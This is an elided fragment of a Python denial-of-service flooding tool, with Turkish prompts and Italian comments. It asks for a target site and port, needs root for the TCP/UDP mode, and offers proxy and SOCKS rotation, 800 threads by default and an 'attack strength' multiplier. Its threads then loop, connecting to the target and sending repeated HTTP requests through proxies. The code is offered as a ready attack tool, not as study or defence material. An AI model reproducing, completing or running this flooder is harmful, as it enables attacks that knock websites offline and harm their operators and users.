...
try: AS
	...
	print ("TCP/UDP SUANLIK KULLANILMIYOR AMA HTTPS AKTIF.") # printa questo
...
def starturl(): # in questa funzione setto l'url per renderlo usabile per il futuro settaggio delle richieste HTTP.
	...
	url = input("\n SİTE LİNKİ İPİSİ: ").strip()

	if url == "":
		print ("LUTFEN İP/URL GİRİN.")
		starturl()
	...
	if choice1 == "0":
		...
		try:
			if os.getuid() != 0: # se il programma NON e' stato eseguito come root:
				print("BUNUN ICIN ROOT İZNİ GEREKİYOR.") # printa questo
				exit(0) # e esce
			else: # altrimenti
				floodport() # continua
		except:
...
def floodport():
	global port
	try:
		port = int(input("FLOOD ATMAK İSTEDİGİN PORTU GİR: "))
		...
		print ("Hatalı Tekrar Dene.") # printa questo e
		floodport() # riparte la funzione e ti fa riscrivere
	proxymode()

def proxymode():
	global choice2
	choice2 = input("Proxy Veya Soket Modu Aktifleşsinmi? evetse 'Y' Hayırsa 'H': ")
	if choice2 == "y":
		choiceproxysocks()
	else:
		numthreads()
...
def choicedownproxy():
	choice4 = input("Proxy Listesini Güncellemek İstermisin? Evetse 'Y': ")
	if choice4 == "y":
...
def choicedownsocks():
	choice4 = input("Soket Listesini Güncellemek İstermisin? Evetse 'Y': ")
	if choice4 == "y":
...
def proxylist():
	global proxies
	out_file = str(input("Proxylerin Yerini Yaz Aktif Olanı Kullanmak İçin 'ENTER' Bas (proxy.txt): "))
	if out_file == "":
		out_file = "proxy.txt"
...
def numthreads():
	global threads
	try:
		threads = int(input("Kaç thread Olsun ? Yazmak İstemessen 'ENTER' Bas (800): "))
	except ValueError:
		threads = 800
...
def multiplication():
	global multiple
	try:
		multiple = int(input("Saldırı Gücünü Ayarla [(1-5=normal)(50=Dengeli)(100=Ultra)]: "))
	except ValueError:
		print("HATALI Tekrar Dene.\n")
		multiplication()
	begin()
...
def begin():
	choice6 = input("'ENTER' A BAS SALDIRI BAŞLASIN [RAT] : ")
	if choice6 == "":
		loop()
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True:
			try:
				...
				s.connect((str(url2),int(port))) # connessione
				s.send(p) # invio
				print ("SALDIRI YÖNLENDİRİLİYOR " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
		...
		while True:
			try:
				...
				try: # il try prova a vedere se l'errore e' causato dalla tipologia di socks errata, infatti prova con SOCKS4
					...
					print ("Proxy Kullanılmıyor. @", self.counter)
